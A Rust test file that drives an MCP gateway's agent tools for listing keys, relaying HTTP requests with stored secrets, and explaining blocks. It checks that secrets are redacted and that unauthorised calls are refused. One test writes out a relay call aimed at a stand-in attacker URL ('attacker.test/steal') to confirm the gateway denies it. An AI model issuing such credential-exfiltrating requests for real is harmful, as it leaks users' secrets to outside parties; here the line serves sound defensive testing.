//! Task 3.2 of m1-remote-mcp: the default-on agent MCP tools (`list_my_keys`,
//! `relay_http_request`, `explain_block`) driven over `/mcp` with the relay harness of the
//! parent module (fake KMS and material, wiremock upstream, in-memory ledger).

use super::*;
use serde_json::{Value, json};

const HOST: &str = "gateway.test";
pub(super) const INITIALIZE: &str = r#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"test","version":"1.0"}}}"#;

/// One MCP exchange: the HTTP status and the JSON-RPC message of the answer (JSON or SSE).
pub(super) async fn rpc(
    h: &Harness,
    token: &str,
    session: Option<&str>,
    body: &str,
) -> (StatusCode, Value, Option<String>) {
    let mut req = Request::post("/mcp")
        .header("host", HOST)
        .header("content-type", "application/json")
        .header("accept", "application/json, text/event-stream")
        .header("authorization", format!("Bearer {token}"));
    if let Some(s) = session {
        req = req
            .header("mcp-session-id", s)
            .header("mcp-protocol-version", "2025-06-18");
    }
    let resp = h
        .app
        .clone()
        .oneshot(req.body(Body::from(body.to_owned())).unwrap())
        .await
        .unwrap();
    let status = resp.status();
    let session = resp
        .headers()
        .get("mcp-session-id")
        .and_then(|v| v.to_str().ok())
        .map(str::to_owned);
    let text =
        String::from_utf8_lossy(&resp.into_body().collect().await.unwrap().to_bytes()).into_owned();
    let json = text
        .lines()
        .filter_map(|l| l.strip_prefix("data:"))
        .find_map(|d| serde_json::from_str::<Value>(d.trim()).ok())
        .or_else(|| serde_json::from_str(&text).ok())
        .unwrap_or(Value::Null);
    (status, json, session)
}

/// A session opened as the harness agent.
pub(super) async fn session(h: &Harness) -> String {
    let (status, _, sid) = rpc(h, &h.token, None, INITIALIZE).await;
    assert_eq!(status, StatusCode::OK);
    let sid = sid.expect("session id");
    let (status, _, _) = rpc(
        h,
        &h.token,
        Some(&sid),
        r#"{"jsonrpc":"2.0","method":"notifications/initialized"}"#,
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED);
    sid
}

pub(super) async fn call_tool(h: &Harness, sid: &str, name: &str, args: Value) -> Value {
    let body = json!({"jsonrpc": "2.0", "id": 2, "method": "tools/call",
                      "params": {"name": name, "arguments": args}});
    let (status, msg, _) = rpc(h, &h.token, Some(sid), &body.to_string()).await;
    assert_eq!(status, StatusCode::OK);
    msg
}

pub(super) fn structured(msg: &Value) -> &Value {
    &msg["result"]["structuredContent"]
}

#[tokio::test]
async fn mcp_tools_list_has_the_default_on_agent_tools_only() {
    let h = harness(Setup::default()).await;
    let sid = session(&h).await;
    let (_, msg, _) = rpc(
        &h,
        &h.token,
        Some(&sid),
        r#"{"jsonrpc":"2.0","id":3,"method":"tools/list"}"#,
    )
    .await;
    let mut names: Vec<&str> = msg["result"]["tools"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| t["name"].as_str().unwrap())
        .collect();
    names.sort_unstable();
    assert_eq!(
        names,
        ["explain_block", "list_my_keys", "relay_http_request"]
    );
}

#[tokio::test]
async fn mcp_off_tool_is_not_callable_by_name() {
    let h = harness(Setup::default()).await;
    let sid = session(&h).await;
    let msg = call_tool(
        &h,
        &sid,
        "issue_short_lived_credential",
        json!({"secret_id": SECRET, "job": "j", "ttl_secs": 60}),
    )
    .await;
    assert!(msg["error"].is_object(), "{msg}");
    assert_eq!(h.kms_calls().await, 0);
    assert!(h.audit.events().is_empty());
}

#[tokio::test]
async fn mcp_list_my_keys_returns_names_and_ids_never_values() {
    let h = harness(Setup::default()).await;
    h.grants.set(
        AGENT,
        vec![
            grant(SECRET, "STRIPE_KEY", None),
            grant(
                UNBOUND,
                "OTHER",
                Some(time::OffsetDateTime::now_utc() - time::Duration::hours(1)),
            ),
        ],
    );
    let sid = session(&h).await;
    let msg = call_tool(&h, &sid, "list_my_keys", json!({})).await;
    let out = structured(&msg);
    let items = out["items"].as_array().unwrap();
    // The expired grant is left out, as on `GET /v1/grants`.
    assert_eq!(items.len(), 1, "{msg}");
    assert_eq!(items[0]["secret_id"], SECRET.to_string());
    assert_eq!(items[0]["name"], "STRIPE_KEY");
    assert_eq!(items[0]["mode"], "relay");
    assert_eq!(items[0]["allowed_origin"], h.origin());
    assert_clean("list_my_keys result", msg.to_string().as_bytes());
    // Listing grants unwraps nothing.
    assert_eq!(h.kms_calls().await, 0);
}

#[tokio::test]
async fn mcp_list_my_keys_pages_and_refuses_a_bad_cursor() {
    let h = harness(Setup::default()).await;
    let sid = session(&h).await;
    let first = call_tool(&h, &sid, "list_my_keys", json!({"limit": 3})).await;
    assert_eq!(structured(&first)["items"].as_array().unwrap().len(), 3);
    let cursor = structured(&first)["next_cursor"]
        .as_str()
        .unwrap()
        .to_owned();
    let second = call_tool(
        &h,
        &sid,
        "list_my_keys",
        json!({"limit": 3, "cursor": cursor}),
    )
    .await;
    assert_eq!(structured(&second)["items"].as_array().unwrap().len(), 1);
    assert!(structured(&second)["next_cursor"].is_null());
    let bad = call_tool(&h, &sid, "list_my_keys", json!({"cursor": "nope"})).await;
    assert!(bad["error"].is_object(), "{bad}");
}

#[tokio::test]
async fn mcp_relay_returns_the_upstream_response_with_the_credential_redacted() {
    let h = harness(Setup::default()).await;
    Mock::given(method("GET"))
        .and(path("/echo"))
        .and(has_header(
            "authorization",
            format!("Bearer {}", std::str::from_utf8(VALUE).unwrap()).as_str(),
        ))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("x-echo-b64", B64.encode(VALUE).as_str())
                .set_body_string(
                    json!({"echo": std::str::from_utf8(VALUE).unwrap(), "ok": true}).to_string(),
                ),
        )
        .mount(&h.upstream)
        .await;
    let sid = session(&h).await;
    let msg = call_tool(
        &h,
        &sid,
        "relay_http_request",
        json!({"secret_id": SECRET, "version": 1, "method": "GET",
               "url": format!("{}/echo", h.origin())}),
    )
    .await;
    assert_ne!(msg["result"]["isError"], true, "{msg}");
    let out = structured(&msg);
    assert_eq!(out["status"], 200, "{msg}");
    let body = out["body"].as_str().unwrap();
    assert!(body.contains("ok"), "{body}");
    assert!(
        !body.contains(std::str::from_utf8(VALUE).unwrap()),
        "{body}"
    );
    // Nothing of the secret reaches the MCP client, in any encoding, in any field of the result.
    assert_clean("relay tool result", msg.to_string().as_bytes());
    // The relay path audited the call: an attempt closed by an ok outcome.
    assert_eq!(h.outcomes(), ["ok"]);
    h.assert_attempts_closed();
}

#[tokio::test]
async fn mcp_relay_without_a_grant_is_a_typed_refusal_and_unwraps_nothing() {
    let h = harness(Setup::default()).await;
    h.grants.set(AGENT, Vec::new());
    let sid = session(&h).await;
    let msg = call_tool(
        &h,
        &sid,
        "relay_http_request",
        json!({"secret_id": SECRET, "version": 1, "method": "GET",
               "url": format!("{}/x", h.origin())}),
    )
    .await;
    assert_eq!(msg["result"]["isError"], true, "{msg}");
    let err = &structured(&msg)["error"];
    assert_eq!(err["code"], "no_grant");
    assert_eq!(err["status"], 403);
    assert_eq!(h.kms_calls().await, 0);
    assert_eq!(Harness::hits(&h.upstream).await, 0);
    assert_eq!(h.outcomes(), ["no_grant"]);
}

#[tokio::test]
async fn mcp_relay_keeps_every_relay_guard() {
    let h = harness(Setup::default()).await;
    let sid = session(&h).await;
    // A host the secret is not bound to is denied, as on /v1/relay.
    let msg = call_tool(
        &h,
        &sid,
        "relay_http_request",
        json!({"secret_id": SECRET, "version": 1, "method": "GET",
               "url": "http://attacker.test/steal"}),
    )
    .await;
    assert_eq!(msg["result"]["isError"], true, "{msg}");
    assert_eq!(structured(&msg)["error"]["code"], "denied");
    assert_eq!(h.kms_calls().await, 0);
    // A malformed request (unknown field, missing version) is refused before any work.
    for args in [
        json!({"secret_id": SECRET, "method": "GET", "url": h.origin()}),
        json!({"secret_id": SECRET, "version": 1, "method": "GET", "url": h.origin(), "extra": 1}),
    ] {
        let msg = call_tool(&h, &sid, "relay_http_request", args).await;
        assert_eq!(msg["result"]["isError"], true, "{msg}");
        assert_eq!(structured(&msg)["error"]["code"], "bad_request");
    }
    assert_eq!(h.kms_calls().await, 0);
    assert_clean("refusals", format!("{:?}", h.audit.events()).as_bytes());
}

#[tokio::test]
async fn mcp_explain_block_is_a_typed_not_available() {
    let h = harness(Setup::default()).await;
    let sid = session(&h).await;
    let msg = call_tool(&h, &sid, "explain_block", json!({"reason": "no_grant"})).await;
    assert_eq!(msg["result"]["isError"], true, "{msg}");
    let err = &structured(&msg)["error"];
    assert_eq!(err["code"], "not_available");
    assert_eq!(err["status"], 501);
    // Bad arguments are a protocol error.
    let bad = call_tool(&h, &sid, "explain_block", json!({})).await;
    assert!(bad["error"].is_object(), "{bad}");
}

#[tokio::test]
async fn mcp_tool_calls_need_the_agent_token() {
    let h = harness(Setup::default()).await;
    let expired = h.signer.sign(&agent_claims(ORG, AUDIENCE, -600)).unwrap();
    let body = json!({"jsonrpc": "2.0", "id": 2, "method": "tools/call",
                      "params": {"name": "list_my_keys", "arguments": {}}});
    let (status, _, _) = rpc(&h, &expired, None, &body.to_string()).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
}
